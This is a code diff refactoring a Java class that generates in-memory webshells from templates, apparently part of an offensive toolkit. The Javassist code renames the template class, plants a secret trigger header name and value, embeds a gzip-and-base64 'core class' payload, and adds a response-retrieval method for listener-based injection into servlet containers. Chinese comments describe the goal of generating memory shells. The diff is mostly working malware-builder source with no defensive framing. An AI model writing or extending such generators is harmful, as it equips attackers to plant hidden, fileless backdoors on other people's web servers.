@@ -5,7 +5,10 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtField;
 import org.leo.core.util.asm.ClassFileMinimizer;
-import org.leo.jmg.ShellGeneratorConfig;
+import org.leo.jmg.ServletNamespace;
+import org.leo.jmg.catalog.InjectorDescriptor;
+import org.leo.jmg.generation.GenerationRequest;
+import org.leo.jmg.generation.GenerationWorkspace;
 import org.leo.jmg.util.base64.Base64Utils;
 import org.leo.jmg.util.javassist.JavassistUtil;
 import org.leo.jmg.util.response.ResponseUtil;
@@ -14,13 +17,24 @@ import java.io.InputStream;
 
 public class ShellGenerator {
 
-    /**
-     * 基于模板类生成内存 Shell
-     *
-     * @param shellTplName  模板类全限定名（如 org.leo.jmg.mem.shell.http.LeoFilterTpl）
-     * @return 生成后的 Shell 类字节码（已做最小化处理）
-     */
-    public byte[] makeShell(ShellGeneratorConfig config, String shellTplName) throws Exception {
+    public byte[] makeShell(GenerationRequest request,
+                            GenerationWorkspace workspace,
+                            InjectorDescriptor descriptor) throws Exception {
+        return makeShell(new ShellTemplateContext(
+                workspace.getShellClassName(),
+                request.getHeaderName(),
+                request.getHeaderValue(),
+                request.getCoreClassName(),
+                workspace.getCoreClassBytes(),
+                request.getResponseCode(),
+                descriptor.getInjectorName(),
+                request.getServerType(),
+                request.getEffectiveServletNamespace()),
+                descriptor.getShellTemplateName());
+    }
+
+    private byte[] makeShell(ShellTemplateContext context,
+                             String shellTplName) throws Exception {
         // 每次操作创建完全独立的池（parent=null），避免模板类被 getDefault() 父池缓存后
         // makeClass() 抛出 "is in a parent ClassPool" 错误
         ClassPool pool = new ClassPool(null);
@@ -42,29 +56,29 @@ public class ShellGenerator {
             CtClass ctClass = pool.makeClass(is);
             try {
                 // 改名为用户指定的 Shell 类名
-                ctClass.setName(config.getShellClassName());
+                ctClass.setName(context.shellClassName);
                 // 统一降到 Java 5，减小兼容性问题
                 ctClass.getClassFile().setVersionToJava5();
 
                 // 用实际配置替换模板中的静态字段
                 replaceStaticField(ctClass, "headerName",
-                        "private static String headerName = \"" + escapeForJavaString(config.getHeaderName()) + "\";");
+                        "private static String headerName = \"" + escapeForJavaString(context.headerName) + "\";");
                 replaceStaticField(ctClass, "headerValue",
-                        "private static String headerValue = \"" + escapeForJavaString(config.getHeaderValue()) + "\";");
+                        "private static String headerValue = \"" + escapeForJavaString(context.headerValue) + "\";");
                 replaceStaticField(ctClass, "coreClassName",
-                        "private static String coreClassName = \"" + escapeForJavaString(config.getCoreClassName()) + "\";");
+                        "private static String coreClassName = \"" + escapeForJavaString(context.coreClassName) + "\";");
                 // coreClass 直接写入字符串，调用方需要保证其内容已经做好压缩/编码
                 replaceStaticField(ctClass, "coreClass",
-                        "private static String coreClass = \"" + escapeForJavaString(Base64Utils.gzipAndBase64(config.getCoreClassBytes())) + "\";");
+                        "private static String coreClass = \"" + escapeForJavaString(Base64Utils.gzipAndBase64(context.coreClassBytes)) + "\";");
                 replaceStaticField(ctClass, "respCode",
-                        "private static int respCode = " + config.getRespCode() + ";");
+                        "private static int respCode = " + context.responseCode + ";");
 
-                if (config.getShellType().equals("ListenerInjector")) {
-                    String methodBody = ResponseUtil.getMethodBody(config.getServerType());
+                if ("ListenerInjector".equals(context.injectorName)) {
+                    String methodBody = ResponseUtil.getMethodBody(context.serverType);
                     JavassistUtil.addMethod(ctClass, "getResponseFromRequest", methodBody);
                 }
 
-                JavassistUtil.applyServletNamespace(ctClass, config.getEffectiveServletNamespace());
+                JavassistUtil.applyServletNamespace(ctClass, context.servletNamespace);
 
                 // 输出并做一次瘦身
                 byte[] bytes = ctClass.toBytecode();
@@ -100,5 +114,37 @@ public class ShellGenerator {
                 .replace("\"", "\\\"")
                 .replace("\r", "\\r")
                 .replace("\n", "\\n");
+    }
+
+    private static final class ShellTemplateContext {
+        private final String shellClassName;
+        private final String headerName;
+        private final String headerValue;
+        private final String coreClassName;
+        private final byte[] coreClassBytes;
+        private final int responseCode;
+        private final String injectorName;
+        private final String serverType;
+        private final ServletNamespace servletNamespace;
+
+        private ShellTemplateContext(String shellClassName,
+                                     String headerName,
+                                     String headerValue,
+                                     String coreClassName,
+                                     byte[] coreClassBytes,
+                                     int responseCode,
+                                     String injectorName,
+                                     String serverType,
+                                     ServletNamespace servletNamespace) {
+            this.shellClassName = shellClassName;
+            this.headerName = headerName;
+            this.headerValue = headerValue;
+            this.coreClassName = coreClassName;
+            this.coreClassBytes = coreClassBytes;
+            this.responseCode = responseCode;
+            this.injectorName = injectorName;
+            this.serverType = serverType;
+            this.servletNamespace = servletNamespace;
+        }
     }
 }
